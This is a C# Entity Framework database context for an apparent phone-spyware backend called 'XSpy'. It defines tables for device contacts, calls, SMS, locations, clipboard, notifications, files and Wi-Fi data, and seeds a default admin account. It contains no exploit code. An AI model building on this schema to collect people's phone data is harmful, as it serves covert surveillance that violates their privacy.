using System;
using System.Linq;
using Microsoft.EntityFrameworkCore;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Entities.Roles;

namespace XSpy.Database
{
    public class DatabaseContext : DbContext
    {
        public DatabaseContext(DbContextOptions<DatabaseContext> options) : base(options)
        {
        }

        protected override void OnModelCreating(ModelBuilder modelBuilder)
        {
            modelBuilder.Entity<User>().HasOne(s => s.RankData);
            
            modelBuilder.Entity<Device>().HasMany(s => s.Contacts).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Calls).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Messages).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Permissions).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Locations).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.TempPaths).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.SavedFiles).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.ImageList).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Clipboards).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Device>().HasMany(s => s.Notifications).WithOne(s => s.DeviceData);
            modelBuilder.Entity<Rank>().HasMany(s => s.Roles).WithOne(s => s.Rank);


            AddDataSeed(modelBuilder);

            base.OnModelCreating(modelBuilder);
        }


        private void AddDataSeed(ModelBuilder modelBuilder)
        {
            var rank1 = Guid.Parse("4288aa01-036a-47e4-9db8-61e425ac2d43");
            var rank2 = Guid.Parse("62a840f9-c6ef-4d56-8652-4d9b46115b95");

            modelBuilder.Entity<Roles>().HasData(
                new Roles {Name = "IS_ADMIN", Title = "É um administrador geral (privilégios globais)"},
                new Roles {Name = "ROLE_C_USER", Title = "Pode criar usuários"},
                new Roles {Name = "ROLE_R_USER", Title = "Pode ler usuários"},
                new Roles {Name = "ROLE_U_USER", Title = "Pode editar usuários"},
                new Roles {Name = "ROLE_D_USER", Title = "Pode deletar usuários"},
                new Roles {Name = "ROLE_C_ROLE", Title = "Pode criar permissões"},
                new Roles {Name = "ROLE_R_ROLE", Title = "Pode ler permissões"},
                new Roles {Name = "ROLE_U_ROLE", Title = "Pode editar permissões"},
                new Roles {Name = "ROLE_D_ROLE", Title = "Pode deletar permissões"},
                new Roles {Name = "IS_NORMAL_USER", Title = "É um usuário comum"}
            );

            modelBuilder.Entity<Rank>().HasData(new Rank()
                {
                    Id = rank1,
                    Name = "Usuário"
                }, new Rank()
                {
                    Id = rank2,
                    Name = "Admin"
                }
            );
            modelBuilder.Entity<RankRole>().HasData(new RankRole()
                {
                    Id = Guid.NewGuid(),
                    RoleName = "IS_NORMAL_USER",
                    RankId = rank1
                }, new RankRole()
                {
                    Id = Guid.NewGuid(),
                    RoleName = "IS_ADMIN",
                    RankId = rank2
                }
            );

            var userId = Guid.NewGuid();
            modelBuilder.Entity<User>().HasData(new User()
            {
                Id = userId,
                Email = "admin@admin.com",
                IsActive = true,
                Password = "$2a$11$SsDzjmfewhAt.q/aLjmfTeqGFEtlNNO08mmw023eQYV6WBJMktDzS",
                DeviceToken = Guid.NewGuid(),
                RankId = rank2
            });


            modelBuilder.Entity<Device>().HasData(new Device()
            {
                Id = Guid.NewGuid(),
                AddedAt = DateTime.Now,
                UpdatedAt = DateTime.Now,
                DeviceId = "000000",
                IsOnline = false,
                LastIp = "0.0.0.0",
                Manufacturer = "Test device",
                Model = "Test-Device",
                SystemVersion = "10",
                UserId = userId
            });
        }


        public DbSet<User> Users { get; set; }
        public DbSet<Rank> Ranks { get; set; }
        public DbSet<RankRole> RankRoles { get; set; }
        public DbSet<Roles> Roles { get; set; }

        public DbSet<Device> Devices { get; set; }
        public DbSet<Call> Calls { get; set; }
        public DbSet<TempPath> TempPaths { get; set; }
        public DbSet<Clipboard> Clipboards { get; set; }
        public DbSet<Contact> Contacts { get; set; }
        public DbSet<File> Files { get; set; }
        public DbSet<FileList> ImageList { get; set; }
        public DbSet<InstalledApps> InstalledApps { get; set; }
        public DbSet<Location> Locations { get; set; }
        public DbSet<Notification> Notifications { get; set; }
        public DbSet<Permission> Permissions { get; set; }
        public DbSet<Wifi> WifiList { get; set; }
        public DbSet<Sms> Messages { get; set; }
    }
}